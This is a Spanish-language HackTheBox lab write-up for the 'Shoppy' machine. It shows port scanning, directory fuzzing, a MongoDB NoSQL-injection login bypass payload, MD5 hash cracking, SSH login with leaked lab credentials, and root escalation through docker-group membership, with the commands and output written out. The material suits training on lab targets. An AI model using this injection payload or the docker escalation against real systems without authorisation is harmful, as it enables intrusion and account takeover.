---
title: Shoppy WriteUp
author: H4ckerLite 
date: 2022-08-28 00:00:00 +0800
categories: [hackthebox, machine, writeup]
tags: [hackthebox, writeup]
pin: pin
image:
  path: ../../assets/img/commons/shoppy-writeup/Shoppy.png 
  alt: Shoppy WriteUp
---

Les explicaré comó comprometer la máquina [Shoppy](https://app.hackthebox.com/machines/496) de HackTheBox. En esta máquina nos enfretaremos a un `NoSQLi` de `MongoDB` y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo **Docker**.

## Escaneo NMAP

Antes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.

``````bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.180 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:59 -04
Initiating SYN Stealth Scan at 11:59
Scanning 10.10.11.180 [65535 ports]
Discovered open port 80/tcp on 10.10.11.180
Discovered open port 22/tcp on 10.10.11.180
Discovered open port 9093/tcp on 10.10.11.180
Completed SYN Stealth Scan at 12:00, 15.14s elapsed (65535 total ports)
Nmap scan report for 10.10.11.180
Host is up, received user-set (0.16s latency).
Scanned at 2023-01-15 11:59:53 -04 for 16s
Not shown: 65368 closed tcp ports (reset), 164 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
9093/tcp open  copycat syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.33 seconds
           Raw packets sent: 74269 (3.268MB) | Rcvd: 73540 (2.942MB)
``````


Nos percatamos que tiene el **SSH** abierto y el puerto 80 que corresponde al **HTTP**, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para soluci
onarlo hacemos lo siguiente:

```bash
echo "10.10.11.180       shoppy.htb" | tee -a /etc/hosts
```

Ahora debemos ver una web con una cuenta regresiva, nada importante

## Enumeración

Enumerando directorios con **WFUZZ** nos encontramos lo siguiente.
***Nota: Debes tener clonado el repositorio de*** **SecList**
```bash
❯ wfuzz -c --hc=404 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ  2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shoppy.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000000053:   200        25 L     62 W       1074 Ch     "login"                                                                                                                
000000016:   301        10 L     16 W       179 Ch      "images"                                                                                                               
000000291:   301        10 L     16 W       179 Ch      "assets"                                                                                                               
000000259:   302        0 L      4 W        28 Ch       "admin"   
```
Nos encontramos con **/login** , intentamos accesder pero esta protegido por un login, podemos probar con una injección **SQL** pero la web no usa **SQL**

![Login Shoppy]({{ 'assets/img/commons/shoppy-writeup/login.png' | relative_url }}){: .center-image }
_Login Shoppy_


Podemos probar `admin'||'1==1` y poner cualquier contraseña:


![Login Shoppy]({{ 'assets/img/commons/shoppy-writeup/login1.png' | relative_url }}){: .center-image }
_Bypass Login_

Bingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección.
![Login Shoppy]({{ 'assets/img/commons/shoppy-writeup/login2.png' | relative_url }}){: .center-image }

Nos sale una opción para descargar, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con john

```bash
echo "admin:23c6877d9e2b564ef8b32c3a23de27b2" > hashes
echo "josh:6ebcea65320589ca4f2f1ce039975995" >> hashes
❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
remembermethisway (josh)
1g 0:00:00:02 DONE (2023-01-15 12:44) 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed

```
Tenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos



```bash
❯ gobuster vhost  -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shoppy.htb/
[+] Method:       GET
[+] Threads:      200
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/01/15 12:48:41 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]
Progress: 52985 / 100001 (52.98%)    
```

Tenemos un subdominio, la misma historia lo añadimos en el `etc/host`.


Al entrar en el web nos encontramos con esto
![Login Shoppy]({{ 'assets/img/commons/shoppy-writeup/josh.png' | relative_url }}){: .center-image }
_Login Mattermost_


Viendo las conversaciones nos dan un usuario y sus credenciales para el *SSH*, nos conectamos.
```bash
❯ ssh jaeger@10.10.11.180
jaeger@10.10.11.180's password: Sh0ppyBest@pp!
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26
manpath: can't set the locale; make sure $LC_* and $LANG are correct
jaeger@shoppy:~$ export TERM=xterm
jaeger@shoppy:~$ 
```
Una vez dentro podemso ver si tenemos un privilegio asignado a sudo, podemos ver podemos ejecutar como el usuario deploy un ejecutable 

## Enumeración del sistema

```bash
jaeger@shoppy:~$ sudo -l
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
jaeger@shoppy:~$ 

```
Jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deploy


![Login Shoppy]({{ 'assets/img/commons/shoppy-writeup/xxd.png' | relative_url }}){: .center-image }
_Password-Manager_


```bash
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
jaeger@shoppy:~$ 
```
Podemos migrar al usuario *Deploy* 


```bash
jaeger@shoppy:~$ su deploy
Password: Deploying@pp!
$ bash
deploy@shoppy:/home/jaeger$ 
deploy@shoppy:/home/jaeger$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
deploy@shoppy:/home/jaeger$ 

 ```

## Escalada de privilegios
Pertenecemos al grupo `docker`  mirando (GtfObins)[https://gtfobins.github.io/gtfobins/docker/#shell] podemos ver que podemos abusar del grupo **docker**
Ejecutamos el comando y nos da una shell como root

 ```bash
 deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash
root@3ea87a82734f:/# 
@S4vitaar a mi me gustaban los dislikes, ahora tengo que usar una extension
 ```
Ganamos acceso root, ta rooteamos las máquinasahora podemos leer las flags.


```bash
root@3ea87a82734f:~# cat root.txt 
3d4c1a0477********************66
root@3ea87a82734f:~# cat /home/jaeger/user.txt 
3d97fe0060********************67
root@3ea87a82734f:~# 
```
